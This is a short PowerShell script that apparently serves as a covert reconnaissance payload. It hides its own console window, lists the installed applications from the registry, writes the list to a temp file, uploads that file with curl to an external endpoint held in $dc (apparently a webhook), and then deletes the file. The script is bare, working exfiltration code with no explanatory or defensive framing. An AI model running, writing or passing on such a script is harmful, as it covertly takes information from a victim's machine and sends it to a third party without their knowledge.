$v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion; $y = $v.Substring(0, 2); if ($y -gt 21) { $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru; $hwnd = (Get-Process -PID $pid).MainWindowHandle; if ($hwnd -ne [System.IntPtr]::Zero) { $Type::ShowWindowAsync($hwnd, 0) }else { $Host.UI.RawUI.WindowTitle = 'hideme'; $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }); $hwnd = $Proc.MainWindowHandle; $Type::ShowWindowAsync($hwnd, 0) } };
# Get a list of all installed applications
$apps = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "^KB\d+" }

# If 64-bit, get additional apps from 32-bit registry path
if ([Environment]::Is64BitOperatingSystem) {
  $apps += Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
  Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "^KB\d+" }
}

# Format the list of applications as a string
$appList = $apps | Sort-Object DisplayName | Format-Table -AutoSize | Out-String

$path = "$env:TEMP\apps.txt"
$appList | Out-File $path
curl.exe -F file1=@"$path" $dc
Remove-Item $path -Force